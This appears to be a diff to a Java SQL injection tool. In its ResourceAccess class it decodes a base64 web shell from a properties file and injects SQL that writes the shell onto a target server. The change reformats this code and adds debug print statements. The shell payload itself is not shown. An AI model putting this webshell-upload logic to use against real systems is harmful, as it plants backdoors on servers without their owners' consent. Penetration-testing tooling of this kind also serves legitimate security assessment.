@@ -250,23 +250,27 @@ public class ResourceAccess {
             return;
         }
         
-        String sourceShellToInject =
-            StringUtil
-            .base64Decode(
-                this.injectionModel.getMediatorUtils()
-                .getPropertiesUtil()
-                .getProperties()
-                .getProperty("shell.web")
-            )
-            .replace(DataAccess.SHELL_LEAD, DataAccess.LEAD)
-            .replace(DataAccess.SHELL_TRAIL, DataAccess.TRAIL);
+        String sourceShellToInject = StringUtil.base64Decode(
+            this.injectionModel.getMediatorUtils()
+            .getPropertiesUtil()
+            .getProperties()
+            .getProperty("shell.web")
+        )
+        .replace(DataAccess.SHELL_LEAD, DataAccess.LEAD)
+        .replace(DataAccess.SHELL_TRAIL, DataAccess.TRAIL);
+        System.out.println(sourceShellToInject);
 
         String pathShellFixed = pathShell;
         if (!pathShellFixed.matches(".*/$")) {
             
             pathShellFixed += "/";
         }
-        
+
+        System.out.println(this.injectionModel
+                .getMediatorVendor()
+                .getVendor()
+                .instance()
+                .sqlTextIntoFile(sourceShellToInject, pathShellFixed + this.filenameWebshell));
         this.injectionModel.injectWithoutIndex(
             this.injectionModel
             .getMediatorVendor()
@@ -287,6 +291,7 @@ public class ResourceAccess {
                 null,
                 "webshell"
             );
+            System.out.println(resultInjection);
 
             if (StringUtils.isEmpty(resultInjection)) {
                 
